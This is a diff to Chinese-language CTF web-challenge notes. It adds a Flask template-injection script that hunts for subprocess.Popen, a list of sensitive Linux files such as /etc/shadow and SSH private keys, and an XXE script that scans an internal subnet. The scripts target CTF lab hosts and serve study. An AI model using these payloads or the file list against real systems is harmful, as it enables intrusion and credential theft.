@@ -53,8 +53,8 @@
 
 - [twig](https://xz.aliyun.com/t/10056#toc-13)(php)
 - [smarty](https://www.anquanke.com/post/id/272393)(php)
-- [flask](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/3%E7%BA%A7/Web/shrine.md)(python)。例题:[[GYCTF2020]FlaskApp](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BGYCTF2020%5DFlaskApp.md)
-- [完整模板注入payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+- [flask](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/3%E7%BA%A7/Web/shrine.md)(python)。例题1:[[GYCTF2020]FlaskApp](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BGYCTF2020%5DFlaskApp.md)。例题2（利用[subprocess.Popen](https://blog.csdn.net/whatday/article/details/109315876)执行命令）:[[CSCCTF 2019 Qual]FlaskLight](https://blog.csdn.net/mochu7777777/article/details/107589811)
+- [更多模板注入payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
 14. [浏览器设置编码](https://blog.csdn.net/jnx1142410525/article/details/55271037)。如果浏览器的编码不对就会出现乱码。
 15. php md5相关特性。
@@ -216,3 +216,105 @@ xhr.send(params);
 
 38.  php pcre回溯限制绕过preg_match。例题:[[FBCTF2019]RCEService](../../CTF/BUUCTF/Web/[FBCTF2019]RCEService.md)
 39.  php basename特性+$_SERVER['PHP_SELF']使用+url解析特性。例题:[[Zer0pts2020]Can you guess it?](../../CTF/BUUCTF/Web/[Zer0pts2020]Can%20you%20guess%20it?.md)
+40.  python pickle反序列化漏洞+jwt爆破secret key。例题:[bilibili](../../CTF/攻防世界/9级/Web/bilibili.md)
+41.  python flask模板注入脚本查找subprocess.Popen索引。
+
+[来源](https://blog.csdn.net/mochu7777777/article/details/107589811)
+
+```python
+import requests 
+import re 
+import html 
+import time 
+index = 0 
+for i in range(170, 1000): 
+    try: 
+        url = "http://e5df30ec-7e81-425e-b1cf-0988f6f9ae6f.node4.buuoj.cn:81/?search={{''.__class__.__mro__[2].__subclasses__()[" + str(i) + "]}}" 
+        r = requests.get(url) 
+        res = re.findall("<h2>You searched for:<\/h2>\W+<h3>(.*)<\/h3>", r.text) 
+        time.sleep(0.1)
+        # print(res) 
+        # print(r.text) 
+        res = html.unescape(res[0]) 
+        print(str(i) + " | " + res) 
+        if "subprocess.Popen" in res: 
+            index = i 
+            break 
+    except: 
+        continue
+print("index of subprocess.Popen:" + str(index))
+```
+
+42. 使用[php_mt_seed](https://www.openwall.com/php_mt_seed/)爆破php伪随机数函数[mt_rand](https://www.freebuf.com/vuls/192012.html)种子。例题:[[GWCTF 2019]枯燥的抽奖](https://blog.csdn.net/shinygod/article/details/124067962)
+43. linux可读取的敏感文件。
+
+[来源](https://www.shawroot.cc/1007.html)
+
+```
+/etc/passwd
+/etc/shadow
+/etc/hosts
+/root/.bash_history //root的bash历史记录
+/root/.ssh/authorized_keys
+/root/.mysql_history //mysql的bash历史记录
+/root/.wget-hsts
+/opt/nginx/conf/nginx.conf //nginx的配置文件
+/var/www/html/index.html
+/etc/my.cnf
+/etc/httpd/conf/httpd.conf //httpd的配置文件
+/proc/self/fd/fd[0-9]*(文件标识符)
+/proc/mounts
+/porc/config.gz
+/proc/sched_debug // 提供cpu上正在运行的进程信息，可以获得进程的pid号，可以配合后面需要pid的利用
+/proc/mounts // 挂载的文件系统列表
+/proc/net/arp //arp表，可以获得内网其他机器的地址
+/proc/net/route //路由表信息
+/proc/net/tcp and /proc/net/udp // 活动连接的信息
+/proc/net/fib_trie // 路由缓存,可用于泄露内网网段
+/proc/version // 内核版本
+/proc/[PID]/cmdline // 可能包含有用的路径信息
+/proc/[PID]/environ // 程序运行的环境变量信息，可以用来包含getshell
+/proc/[PID]/cwd // 当前进程的工作目录
+/proc/[PID]/fd/[#] // 访问file descriptors，某写情况可以读取到进程正在使用的文件，比如access.log
+ssh
+/root/.ssh/id_rsa
+/root/.ssh/id_rsa.pub
+/root/.ssh/authorized_keys
+/etc/ssh/sshd_config
+/var/log/secure
+/etc/sysconfig/network-scripts/ifcfg-eth0
+/etc/syscomfig/network-scripts/ifcfg-eth1
+```
+
+44. 基础[xxe](../../CTF/BUUCTF/Web/[NCTF2019]Fake%20XML%20cookbook.md)探测内网网段脚本。
+
+题目及来源:[[NCTF2019]True XML cookbook](https://www.cnblogs.com/Article-kelp/p/16026652.html)
+
+```python
+import requests as res
+url="http://9b0cf961-6439-461e-862f-882833e83736.node4.buuoj.cn:81/doLogin.php"
+rawPayload='<?xml version="1.0"?>'\
+         '<!DOCTYPE user ['\
+         '<!ENTITY payload1 SYSTEM "http://10.244.80.{}">'\
+         ']>'\
+         '<user>'\
+         '<username>'\
+         '&payload1;'\
+         '</username>'\
+         '<password>'\
+         '23'\
+         '</password>'\
+         '</user>'
+for i in range(1,256):
+    payload=rawPayload.format(i)
+    #payload=rawPayload
+    print(str("#{} =>").format(i),end='')
+    try:
+        resp=res.post(url,data=payload,timeout=0.3)
+    except:
+        continue
+    else:
+        print(resp.text,end='')
+    finally:
+        print('')
+```
